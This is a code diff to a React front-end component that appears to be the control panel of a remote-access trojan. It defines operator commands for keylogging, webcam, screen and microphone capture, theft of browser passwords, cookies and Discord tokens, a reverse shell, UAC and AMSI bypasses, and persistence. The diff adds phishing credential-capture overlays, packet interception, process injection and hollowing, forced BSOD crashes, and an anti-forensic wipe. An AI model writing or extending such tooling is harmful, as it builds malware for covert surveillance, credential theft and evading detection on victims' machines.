@@ -1,7 +1,7 @@
 'use client'
 
 import { useState, useEffect, useRef, useCallback } from 'react'
-import { Send, Terminal, Eye, Database, Lock, Network, Trash2, Settings, MousePointer2, Search } from 'lucide-react'
+import { Send, Terminal, Eye, Database, Lock, Network, Trash2, Settings, MousePointer2, Search, ShieldAlert } from 'lucide-react'
 import { Card, CardContent, CardTitle } from '@/components/ui/card'
 import { Button } from '@/components/ui/button'
 
@@ -42,13 +42,15 @@ const commands: Command[] = [
   { id: 'keylog', category: 'Surveillance', name: 'Keylogger Control', description: 'Start/Stop/Dump keystrokes', icon: Eye, color: 'text-purple-400', params: ['action'] },
   { id: 'clipboard', category: 'Surveillance', name: 'Clipboard Control', description: 'Get/Set clipboard', icon: Eye, color: 'text-purple-400', params: ['action', 'text'] },
   { id: 'active_window', category: 'Surveillance', name: 'Active Window', description: 'Get foreground window title', icon: Eye, color: 'text-purple-400' },
+  { id: 'audio_stream', category: 'Surveillance', name: 'Live Audio Stream', description: 'Real-time microphone monitoring', icon: Eye, color: 'text-purple-400', params: ['action'] },
   { id: 'window_logger', category: 'Surveillance', name: 'Window Logger', description: 'Background window tracker', icon: Eye, color: 'text-purple-400', params: ['action'] },
   { id: 'recstream', category: 'Surveillance', name: 'Record Screen', description: 'Record screen to MP4', icon: Eye, color: 'text-purple-400', params: ['action'] },
   { id: 'recwcam', category: 'Surveillance', name: 'Record Webcam', description: 'Record webcam to MP4', icon: Eye, color: 'text-purple-400', params: ['action'] },
+  { id: 'recaudio', category: 'Surveillance', name: 'Record Audio', description: 'Record microphone to WAV', icon: Eye, color: 'text-purple-400', params: ['action'] },
 
   // Credentials
   { id: 'browser_passwords', category: 'Credentials', name: 'Browser Passwords', description: 'Extract saved passwords', icon: Lock, color: 'text-red-400' },
-  { id: 'browser_cookies', category: 'Credentials', name: 'Browser Cookies', description: 'Extract browser cookies', icon: Lock, color: 'text-red-400' },
+  { id: 'browser_cookies', category: 'Credentials', name: 'Browser Cookies', description: 'Extract browser cookies (Normal/Live)', icon: Lock, color: 'text-red-400', params: ['url', 'live'] },
   { id: 'wifi_passwords', category: 'Credentials', name: 'WiFi Passwords', description: 'Extract WiFi credentials', icon: Lock, color: 'text-red-400' },
   { id: 'chromelevator', category: 'Credentials', name: 'Chromelevator', description: 'Advanced Chrome extractor', icon: Lock, color: 'text-red-400' },
   { id: 'extract_discord', category: 'Credentials', name: 'Extract Discord', description: 'Steal Discord session tokens', icon: Lock, color: 'text-red-400' },
@@ -66,6 +68,7 @@ const commands: Command[] = [
   { id: 'wifi_control', category: 'Network', name: 'WiFi Manager', description: 'Scan, Enable or Disable WiFi', icon: Network, color: 'text-blue-400', params: ['action'] },
   { id: 'bluetooth_control', category: 'Network', name: 'Bluetooth Manager', description: 'Enable or Disable Bluetooth', icon: Network, color: 'text-blue-400', params: ['action'] },
   { id: 'socks', category: 'Network', name: 'SOCKS5 Proxy', description: 'Start cross-platform tunneling', icon: Network, color: 'text-blue-400', params: ['action', 'port'] },
+  { id: 'interception', category: 'Network', name: 'Network Interceptor', description: 'Monitor and manipulate network packets', icon: Network, color: 'text-blue-500', params: ['action', 'port', 'enabled', 'rules'] },
   { id: 'reverse_shell', category: 'Network', name: 'Reverse Shell', description: 'Reverse connect back to attacker', icon: Terminal, color: 'text-blue-400', params: ['ip', 'port'] },
   { id: 'service', category: 'System', name: 'Service Control', description: 'Manage Windows services', icon: Network, color: 'text-green-400', params: ['action', 'name'] },
   { id: 'av_discovery', category: 'System', name: 'AV Discovery', description: 'Detect installed Antivirus engines', icon: Lock, color: 'text-green-400' },
@@ -74,7 +77,7 @@ const commands: Command[] = [
   { id: 'persistence', category: 'Persistence', name: 'Enable Persistence', description: 'Install persistence mechanism', icon: Lock, color: 'text-amber-400' },
   { id: 'unpersist', category: 'Persistence', name: 'Remove Persistence', description: 'Uninstall persistence', icon: Lock, color: 'text-amber-400' },
   { id: 'elevate', category: 'Persistence', name: 'Request Admin (UAC)', description: 'Trigger explicit UAC elevation', icon: Lock, color: 'text-amber-400' },
-  { id: 'uac_bypass', category: 'Persistence', name: 'Silent UAC Bypass', description: 'Automated Fodhelper elevation', icon: Lock, color: 'text-amber-400', params: ['program'] },
+  { id: 'uac', category: 'Privileges', name: 'UAC Bypass', description: 'Elevate to Admin/SYSTEM (fodhelper, silentcleanup, computerdefaults)', icon: Lock, color: 'text-orange-500', params: ['method', 'program'] },
   { id: 'amsi_bypass', category: 'Persistence', name: 'AMSI Patch', description: 'Patch AMSI in memory', icon: Lock, color: 'text-amber-400' },
   { id: 'enable_rdp', category: 'Persistence', name: 'Enable RDP', description: 'Open RDP daemon and Firewall', icon: Lock, color: 'text-amber-400', params: ['adduser'] },
   { id: 'unelevate', category: 'Persistence', name: 'Drop Privileges', description: 'Relinquish Administrator token', icon: Lock, color: 'text-amber-400' },
@@ -86,14 +89,25 @@ const commands: Command[] = [
   { id: 'volume_control', category: 'Interaction', name: 'Volume Control', description: 'Get/Set/Mute system volume', icon: Terminal, color: 'text-orange-400', params: ['action', 'level'] },
   { id: 'brightness_control', category: 'Interaction', name: 'Brightness Control', description: 'Get/Set screen brightness', icon: Terminal, color: 'text-orange-400', params: ['action', 'level'] },
   { id: 'wallpaper', category: 'Interaction', name: 'Set Wallpaper', description: 'Change desktop background', icon: Terminal, color: 'text-orange-400', params: ['path'] },
+  { id: 'monitor_control', category: 'Interaction', name: 'Monitor Control', description: 'Turn monitors ON/OFF', icon: Terminal, color: 'text-orange-400', params: ['state'] },
   { id: 'power', category: 'Interaction', name: 'Power Control', description: 'Lock/Shutdown/Reboot', icon: Terminal, color: 'text-orange-400', params: ['action'] },
   { id: 'input_control', category: 'Interaction', name: 'Mouse & Keyboard', description: 'Remote control system inputs', icon: Terminal, color: 'text-orange-400', params: ['action', 'x', 'y', 'button', 'text'] },
   { id: 'block_input', category: 'Interaction', name: 'Block Input', description: 'Disable local input devices', icon: Lock, color: 'text-orange-400', params: ['state'] },
   { id: 'browser_kill', category: 'Interaction', name: 'Kill Browsers', description: 'Force crash web browsers', icon: Trash2, color: 'text-orange-400' },
   { id: 'set_autorun', category: 'Interaction', name: 'Autorun Scripts', description: 'Configure reconnect commands', icon: Terminal, color: 'text-orange-400', params: ['json'] },
   
+  // Phishing
+  { id: 'phishing', category: 'Phishing', name: 'Phishing Overlay', description: 'Deploy credential capture templates', icon: Lock, color: 'text-pink-400', params: ['template', 'title', 'message'] },
+
+  // Advanced Disruption
+  { id: 'bsod', category: 'Disruption', name: 'Trigger BSOD', description: 'Force kernel-level system crash', icon: Trash2, color: 'text-red-600' },
+  { id: 'block_apps', category: 'Disruption', name: 'Guardian Mode', description: 'Kill unauthorized processes (Taskmgr, etc)', icon: Lock, color: 'text-red-500', params: ['action'] },
+  { id: 'inject', category: 'Execution', name: 'Process Injection', description: 'Inject shellcode into process', icon: Terminal, color: 'text-blue-500', params: ['pid', 'shellcode_path'] },
+  { id: 'hollow', category: 'Execution', name: 'Process Hollowing', description: 'Hollow and replace process', icon: Terminal, color: 'text-blue-500', params: ['program', 'shellcode_path'] },
+
   // Cleanup
   { id: 'abort', category: 'Cleanup', name: 'Abort Task', description: 'Kill asynchronous module by ID', icon: Trash2, color: 'text-gray-400', params: ['id'] },
+  { id: 'panic', category: 'Cleanup', name: 'Panic Button', description: 'Emergency Anti-Forensic Wipe + BSOD', icon: ShieldAlert, color: 'text-red-600' },
   { id: 'clean_traces', category: 'Cleanup', name: 'Clean Traces', description: 'Remove forensic evidence', icon: Trash2, color: 'text-gray-400' },
   { id: 'self_destruct', category: 'Cleanup', name: 'Self Destruct', description: 'Remove malware from system', icon: Trash2, color: 'text-gray-400' }
 ]
@@ -104,23 +118,30 @@ const paramOptions: Record<string, Record<string, string[]>> = {
   'webcam': { resolution: ['1920x1080', '1280x720', '640x480'] },
   'stream': { action: ['start', 'stop'], fps: ['10', '20', '30'], height: ['1080', '720', '480'] },
   'webcam_stream': { action: ['start', 'stop'], fps: ['10', '20', '30'] },
-  'keylog': { action: ['start', 'stop', 'dump', 'status'] },
+  'keylog': { action: ['start', 'stop', 'dump', 'status', 'clear'] },
+  'audio_stream': { action: ['start', 'stop'] },
   'clipboard': { action: ['get', 'set'] },
   'window_logger': { action: ['start', 'stop', 'dump', 'status'] },
   'recstream': { action: ['start', 'stop'] },
   'recwcam': { action: ['start', 'stop'] },
+  'recaudio': { action: ['start', 'stop'] },
   'process': { action: ['list', 'kill'] },
   'registry': { action: ['read', 'write', 'delete'] },
   'wifi_control': { action: ['scan', 'enable', 'disable', 'status'] },
   'bluetooth_control': { action: ['enable', 'disable', 'status'] },
   'socks': { action: ['start', 'stop'] },
+  'interception': { action: ['start', 'stop', 'status', 'toggle_monitor', 'toggle_intercept', 'system_proxy'], enabled: ['true', 'false'] },
   'service': { action: ['start', 'stop', 'list'] },
   'enable_rdp': { adduser: ['true', 'false'] },
   'volume_control': { action: ['get', 'set', 'mute', 'unmute'] },
   'brightness_control': { action: ['get', 'set'] },
   'power': { action: ['lock', 'logout', 'reboot', 'shutdown'] },
   'input_control': { action: ['move', 'click', 'type'], button: ['left', 'right', 'middle'] },
-  'block_input': { state: ['true', 'false'] }
+  'block_input': { state: ['true', 'false'] },
+  'phishing': { template: ['windows', 'google', 'microsoft', 'discord'] },
+  'block_apps': { action: ['on', 'off'] },
+  'monitor_control': { state: ['on', 'off'] },
+  'browser_cookies': { live: ['true', 'false'] }
 }
 
 const categories = Array.from(new Set(commands.map((cmd) => cmd.category)))
